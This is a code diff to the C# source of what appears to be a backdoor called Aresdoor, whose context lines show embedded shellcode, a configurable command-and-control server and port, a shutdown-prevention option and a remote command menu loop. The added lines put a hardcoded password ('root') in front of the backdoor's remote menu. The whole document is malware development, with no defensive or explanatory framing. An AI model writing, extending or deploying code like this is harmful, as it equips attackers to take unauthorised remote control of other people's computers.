@@ -8,6 +8,7 @@ namespace aresdoor
         private static byte[] shellcode = System.Text.Encoding.ASCII.GetBytes(shellcode_);
 
         // Modify these variables as needed.
+        private static string backdoorPassword = "root";
         private static string server = "localhost";
         private static int port = 9000;
         private static bool prevent_shutdown = false;
@@ -82,6 +83,20 @@ namespace aresdoor
                         while (true)
                         {
                             candcmenu:
+                            
+                            if (backdoorPassword != "")
+                            {
+                                nc.DataTravelTO(tcpClient, "This copy of Aresdoor has been password protected.\n\n");
+
+                                inputPassword:
+
+                                nc.DataTravelTO(tcpClient, "Password: ");
+                                if (nc.DataTravelFROM(tcpClient).Replace("\n", string.Empty) != backdoorPassword)
+                                {
+                                    nc.DataTravelTO(tcpClient, "Access denied.\n\n");
+                                    goto inputPassword;
+                                } // else continue
+                            }
 
                             string aresdoorStartMenu = string.Empty;
                             string responseFromServer = string.Empty;
